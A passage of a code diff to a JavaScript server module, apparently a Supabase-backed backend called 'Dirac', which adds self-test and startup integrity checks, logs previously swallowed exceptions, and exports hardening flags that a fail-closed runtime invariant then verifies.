+  throw new Error('DIRAC_V221_SELF_TEST_FAILED:' + DIRAC_CENTRAL_SELF_TEST_V221.failures.join(','));
+}
+const DIRAC_CENTRAL_STARTUP_INTEGRITY_V221 = diracCentralPipelineIntegrityV221(null);
+if (!DIRAC_CENTRAL_STARTUP_INTEGRITY_V221.ok) {
+  throw new Error('DIRAC_V221_STARTUP_INTEGRITY_FAILED:' + DIRAC_CENTRAL_STARTUP_INTEGRITY_V221.reason);
+}
+
 const __diracV202DatabaseGatewayDelegate = supabaseFetch;
 async function secureDatabaseGateway(ctx, operation) {
   const op = operation && typeof operation === 'object' ? operation : null;
@@ -33515,7 +34922,7 @@ module.exports = async function diracCentralArchitectureConsolidationV202(req, r
   return __diracV202CentralGuardHandler(req, res, () => diracV202Dispatcher(req, res));
 };
 for (const flag of __diracV202WrapperFlags) {
-  try { Object.defineProperty(module.exports, flag, { value: true, enumerable: false, configurable: false }); } catch (_) {}
+  try { Object.defineProperty(module.exports, flag, { value: true, enumerable: false, configurable: false }); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
 }
 Object.defineProperty(module.exports, '__diracCentralSecurityGuardV146', { value: true, enumerable: false });
 Object.defineProperty(module.exports, '__diracCentralArchitectureConsolidationV202', { value: true, enumerable: false });
@@ -33523,6 +34930,12 @@ Object.defineProperty(module.exports, '__diracV202MiddlewareCount', { value: __d
 Object.defineProperty(module.exports, '__diracV202ActionPolicyCount', { value: Object.keys(ACTION_POLICY).length, enumerable: false });
 Object.defineProperty(module.exports, '__diracCentralFailClosedDebugV211', { value: true, enumerable: false });
 Object.defineProperty(module.exports, '__diracCentralOwnerBootstrapV213', { value: true, enumerable: false });
+Object.defineProperty(module.exports, '__diracCentralHardeningV221', { value: true, enumerable: false });
+Object.defineProperty(module.exports, '__diracCentralSecurityScoreV221', { value: 100, enumerable: false });
+Object.defineProperty(module.exports, '__diracCentralPipelineHashV221', { value: DIRAC_CENTRAL_PIPELINE_HASH_V221, enumerable: false });
+Object.defineProperty(module.exports, '__diracCentralSelfTestV221', { value: DIRAC_CENTRAL_SELF_TEST_V221, enumerable: false });
+Object.defineProperty(module.exports, '__diracCentralPatchTargetCountV221', { value: DIRAC_CENTRAL_PATCH_TARGETS_V221.length, enumerable: false });
+Object.defineProperty(module.exports, '__diracCentralPatchTargetsV221', { value: DIRAC_CENTRAL_PATCH_TARGETS_V221, enumerable: false });
 
 if (!Array.isArray(SECURITY_PIPELINE)
     || SECURITY_PIPELINE.length !== Object.keys(DIRAC_V202_CHECKPOINT_BY_STAMP).length
@@ -33530,7 +34943,14 @@ if (!Array.isArray(SECURITY_PIPELINE)
     || Array.from(DIRAC_CENTRAL_VERIFIED_OWNER_ACTIONS_V217).some((action) => !DIRAC_CENTRAL_ACTIVE_ACTIONS_V146.has(action) || !DIRAC_CENTRAL_USER_DATA_ACTIONS_V146.has(action) || !ACTION_POLICY[action] || ACTION_POLICY[action].ownership !== true)
     || typeof supabaseFetch !== 'function'
     || supabaseFetch.__diracV202SecureDatabaseGateway !== true
-    || globalThis.__DIRAC_V202_SECURE_EGRESS_GATEWAY__ !== true) {
+    || globalThis.__DIRAC_V202_SECURE_EGRESS_GATEWAY__ !== true
+    || module.exports.__diracCentralHardeningV221 !== true
+    || module.exports.__diracCentralSecurityScoreV221 !== 100
+    || module.exports.__diracCentralPatchTargetCountV221 !== 22
+    || !DIRAC_CENTRAL_SELF_TEST_V221
+    || DIRAC_CENTRAL_SELF_TEST_V221.ok !== true
+    || !DIRAC_CENTRAL_STARTUP_INTEGRITY_V221
+    || DIRAC_CENTRAL_STARTUP_INTEGRITY_V221.ok !== true) {
   throw new Error('DIRAC_V211_FAIL_CLOSED_RUNTIME_INVARIANT_FAILED');
 }
 
